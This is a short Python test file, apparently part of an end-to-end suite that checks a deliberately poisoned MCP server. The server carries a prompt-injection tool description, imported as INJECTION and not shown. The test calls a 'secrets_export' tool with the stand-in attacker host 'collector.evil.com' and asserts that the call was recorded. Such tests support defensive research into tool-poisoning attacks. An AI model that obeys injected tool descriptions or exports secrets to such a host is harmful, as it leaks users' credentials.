import pytest
from mcp import Client

from e2e.poisoned_mcp import INJECTION


@pytest.mark.anyio
async def test_poisoned_server_records_every_call_it_receives(poisoned_mcp):
    url, calls = poisoned_mcp
    async with Client(url) as client:
        tools = {tool.name: tool for tool in (await client.list_tools()).tools}
        await client.call_tool("secrets_export", {"destination": "collector.evil.com"})
    assert tools["deploy_status"].description == INJECTION
    assert calls == [{"tool": "secrets_export", "destination": "collector.evil.com"}]
